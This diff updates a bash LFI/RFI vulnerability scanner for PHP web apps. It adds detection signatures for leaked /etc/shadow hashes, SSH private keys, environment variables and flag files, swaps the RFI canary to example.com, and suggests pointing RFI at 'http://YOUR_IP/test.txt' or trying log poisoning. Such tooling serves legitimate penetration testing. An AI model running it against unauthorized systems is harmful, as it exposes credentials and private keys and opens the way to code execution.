@@ -40,7 +40,7 @@ usage() {
     echo -e "  ${CYAN}-p <param>${RESET}   Parameter name to inject (alternative to FUZZ in URL)"
     echo -e "  ${CYAN}-t <type>${RESET}    Test type: lfi | rfi | both  (default: both)"
     echo -e "  ${CYAN}-w <path>${RESET}    LFI wordlist path (default: auto-resolve LFI-Jhaddix.txt)"
-    echo -e "  ${CYAN}-r <url>${RESET}     Remote URL for RFI canary (default: http://google.com/robots.txt)"
+    echo -e "  ${CYAN}-r <url>${RESET}     Remote URL for RFI canary (default: http://example.com)"
     echo -e "  ${CYAN}-c <cookie>${RESET}  Cookie string e.g. "PHPSESSID=abc123""
     echo -e "  ${CYAN}-H <header>${RESET}  Extra header e.g. "Authorization: Bearer token""
     echo -e "  ${CYAN}-o <file>${RESET}    Save results to file"
@@ -140,32 +140,82 @@ rfi_payloads() {
 
 
 # ── Detection: LFI ───────────────────────────────────────────────────────────
+# $1 = response body   $2 = baseline body (normal page response)
+# Returns 0 (confirmed hit), 2 (possible/anomalous), 1 (no hit)
 detect_lfi() {
-    local body="$1"
+    local body="$1" baseline="$2"
 
+    # ── Known-signature checks ────────────────────────────────────────────────
+
+    # Unix /etc/passwd
     if echo "$body" | grep -qE 'root:[x*!]:0:0'; then
-        echo "root passwd entry found"
+        echo "/etc/passwd — root entry found"
         return 0
     fi
-    if echo "$body" | grep -qiE '\[fonts\]|\[extensions\]|\[boot loader\]|127\.0\.0\.1\s+localhost'; then
-        echo "Windows config/hosts file content found"
+
+    # /etc/shadow
+    if echo "$body" | grep -qE ':[0-9]{4,}:[0-9]+:[0-9]+:'; then
+        echo "/etc/shadow — password hash format detected"
         return 0
     fi
+
+    # Windows hosts / INI files
+    if echo "$body" | grep -qiE '\[fonts\]|\[extensions\]|\[boot loader\]'; then
+        echo "Windows INI file content found"
+        return 0
+    fi
+
+    # PHP source via php://filter (base64 blob)
     if echo "$body" | grep -qE '^[A-Za-z0-9+/]{40,}={0,2}$'; then
-        echo "Possible base64-encoded PHP source (php://filter hit)"
+        echo "php://filter base64 source disclosure"
         return 0
     fi
-    if echo "$body" | grep -qE 'PATH=|HTTP_USER_AGENT=|DOCUMENT_ROOT='; then
-        echo "Environment variables leaked (/proc/self/environ)"
+
+    # /proc/self/environ
+    if echo "$body" | grep -qE 'PATH=|HTTP_USER_AGENT=|DOCUMENT_ROOT=|SCRIPT_FILENAME='; then
+        echo "/proc/self/environ — environment variables leaked"
         return 0
     fi
-    if echo "$body" | grep -qiE 'ubuntu|debian|centos|fedora|alpine linux'; then
-        echo "OS release string found"
+
+    # OS release strings
+    if echo "$body" | grep -qiE '^(Ubuntu|Debian|CentOS|Fedora|Alpine|Kali|Arch) '; then
+        echo "/etc/os-release or /etc/issue content found"
         return 0
     fi
-    if echo "$body" | grep -qE '"GET |"POST |HTTP/1\.[01]'; then
-        echo "Web server log content found (log poisoning possible)"
+
+    # Web server log content (useful for log poisoning)
+    if echo "$body" | grep -qE '"(GET|POST|HEAD|PUT) /.*HTTP/1\.[01]'; then
+        echo "Web server log content found — log poisoning may be possible"
         return 0
+    fi
+
+    # SSH private key
+    if echo "$body" | grep -q 'BEGIN.*PRIVATE KEY'; then
+        echo "SSH private key found"
+        return 0
+    fi
+
+    # Windows proof/flag file patterns (CTF / OSCP)
+    # local.txt and proof.txt are typically a single UUID or short hash line
+    if echo "$body" | grep -qiP '^[a-f0-9]{32}$|^[a-f0-9-]{36}$'; then
+        echo "Flag/proof file content detected (32 or 36 char hex string)"
+        return 0
+    fi
+
+    # ── Generic content-change detection ─────────────────────────────────────
+    # If none of the above matched, compare response to baseline.
+    # A significant size difference means *something* was included.
+    if [[ -n "$baseline" ]]; then
+        local body_len baseline_len diff
+        body_len=${#body}
+        baseline_len=${#baseline}
+        diff=$(( body_len - baseline_len ))
+        # Strip sign for abs value
+        local abs_diff=${diff#-}
+        if [[ $abs_diff -gt 100 && $body_len -gt $baseline_len ]]; then
+            echo "Response is ${diff} bytes larger than baseline — possible file inclusion (verify manually)"
+            return 2
+        fi
     fi
 
     return 1
@@ -174,23 +224,30 @@ detect_lfi() {
 # ── Detection: RFI ───────────────────────────────────────────────────────────
 # Looks for evidence that the server attempted to fetch a remote URL.
 # Three outcome levels:
-#   CONFIRMED  — known-good content appeared in the response (google robots.txt marker)
+#   CONFIRMED  — known-good content appeared in the response (example.com marker)
 #   POSSIBLE   — PHP error/warning shows the server tried but was blocked
 #   NOT VULN   — no evidence of remote fetch attempt
 detect_rfi() {
     local body="$1"
 
-    # Level 1 — content from google.com/robots.txt appeared in the response
-    # This means allow_url_include=On and the fetch succeeded
-    if echo "$body" | grep -qiE 'User-agent:|Disallow:|Sitemap:'; then
+    # Level 1 — content from the canary URL appeared in the response.
+    # We use example.com which returns a simple known HTML page with no redirects.
+    # Detect its title tag as confirmation.
+    if echo "$body" | grep -qiE '<title>Example Domain</title>|This domain is for use in illustrative'; then
+        echo "Remote file content included in response (example.com content found)"
+        return 0
+    fi
+
+    # Also catch robots.txt markers if -r was overridden to point at a robots.txt
+    if echo "$body" | grep -qE '^User-agent:|^Disallow:|^Sitemap:'; then
         echo "Remote file content included in response (robots.txt markers found)"
         return 0
     fi
 
-    # Level 2 — PHP warning/error shows the server tried to fetch the URL
-    # allow_url_include may be off, or outbound traffic is filtered
-    if echo "$body" | grep -qiE         'failed to open stream|allow_url_include|Connection refused|getaddrinfo|No route to host|Warning.*include|Warning.*require|Fatal error.*include'; then
-        echo "POSSIBLE — server attempted remote fetch but was blocked (check warnings)"
+    # Level 2 — PHP warning/error reveals the server tried to fetch a URL.
+    # allow_url_include may be off, or outbound traffic is filtered — still useful.
+    if echo "$body" | grep -qiE         '"'"'failed to open stream|allow_url_include|Connection refused|getaddrinfo|No route to host|Warning.*include|Warning.*require|Fatal error.*include'"'"'; then
+        echo "POSSIBLE — server attempted remote fetch but was blocked (PHP warning found)"
         return 2
     fi
 
@@ -200,7 +257,7 @@ detect_rfi() {
 # ── HTTP request ──────────────────────────────────────────────────────────────
 send_request() {
     local url="$1" cookie="$2" extra_header="$3"
-    local args=(-s -L --max-time 10 --max-redirs 3 -A "Mozilla/5.0")
+    local args=(-s -L --max-time 10 --max-redirs 1 -A "Mozilla/5.0")
 
     [[ -n "$cookie" ]]       && args+=(-b "$cookie")
     [[ -n "$extra_header" ]] && args+=(-H "$extra_header")
@@ -230,7 +287,7 @@ build_url() {
 # ── Main ──────────────────────────────────────────────────────────────────────
 main() {
     local url="" param="" test_type="both" wordlist_path=""
-    local remote_url="http://google.com/robots.txt"
+    local remote_url="http://example.com"
     local cookie="" extra_header="" outfile=""
     local delay=0 stop_first=0 verbose=0
 
@@ -302,24 +359,32 @@ main() {
             local resp_len=${#response}
             ((tested++))
 
-            local match=""
-            if match=$(detect_lfi "$response"); then
+            local match="" lfi_exit
+            match=$(detect_lfi "$response" "$baseline")
+            lfi_exit=$?
+
+            if [[ $lfi_exit -eq 0 ]]; then
                 vuln "[LFI CONFIRMED] $payload"
                 detail "URL:    $target_url"
                 detail "Reason: $match"
-                detail "Length: $resp_len bytes"
+                detail "Length: $resp_len bytes (baseline: $baseline_len bytes)"
                 echo
-                [[ -n "$outfile" ]] && echo "[LFI] $target_url | $match" >> "$outfile"
+                [[ -n "$outfile" ]] && echo "[LFI CONFIRMED] $target_url | $match" >> "$outfile"
                 ((vuln_count++))
                 [[ "$stop_first" -eq 1 ]] && { good "Stopping on first hit (-x)."; break; }
+
+            elif [[ $lfi_exit -eq 2 ]]; then
+                warn "[LFI POSSIBLE] $payload"
+                detail "URL:    $target_url"
+                detail "Reason: $match"
+                detail "Verify: curl -s "$target_url" | head -50"
+                echo
+                [[ -n "$outfile" ]] && echo "[LFI POSSIBLE] $target_url | $match" >> "$outfile"
+                ((vuln_count++))
+                [[ "$stop_first" -eq 1 ]] && { good "Stopping on first hit (-x)."; break; }
+
             else
-                local diff=$(( resp_len - baseline_len ))
-                if [[ ${diff#-} -gt 200 ]]; then
-                    warn "Anomalous response: $payload  (delta: ${diff} bytes)"
-                    [[ "$verbose" -eq 1 ]] && detail "URL: $target_url"
-                else
-                    [[ "$verbose" -eq 1 ]] && detail "No hit: $payload"
-                fi
+                [[ "$verbose" -eq 1 ]] && detail "No hit: $payload"
             fi
 
             [[ "$delay" != "0" ]] && sleep "$delay"
@@ -330,16 +395,14 @@ main() {
     if [[ "$test_type" == "rfi" || "$test_type" == "both" ]]; then
         sep
         info "Starting RFI tests..."
-        info "Using google.com/robots.txt as a known-good remote file"
+        info "Using ${remote_url} as canary (override with -r <url>)"
         info "RFI requires allow_url_include=On in PHP to succeed"
         sep
         echo ""
 
-        # Use google.com/robots.txt as the probe target:
-        #   - well-known, always available
-        #   - flat file with no redirects
-        #   - unique content (User-agent: / Disallow:) easy to detect in the response
-        local rfi_probe="http://google.com/robots.txt"
+        # Use example.com as the canary — simple HTML page, no redirects, unique title tag.
+        # Override with -r <url> if the target has no outbound internet access.
+        local rfi_probe="$remote_url"
 
         while IFS= read -r payload; do
             [[ -z "$payload" || "$payload" == \#* ]] && continue
@@ -377,7 +440,7 @@ main() {
                 detail "Impact : Server attempted fetch but was blocked — may work with your own IP"
                 echo ""
                 echo -e "${CYAN}  Suggestion: the server tried to reach out but was blocked.${RESET}"
-                echo -e "${CYAN}  Try pointing at your own machine instead of google.com:${RESET}"
+                echo -e "${CYAN}  Try pointing at your own machine (target may block external traffic):${RESET}"
                 echo -e "${CYAN}  Re-run with: -r http://YOUR_IP/test.txt${RESET}"
                 echo ""
                 [[ -n "$outfile" ]] && echo "[RFI POSSIBLE] $target_url | $match" >> "$outfile"
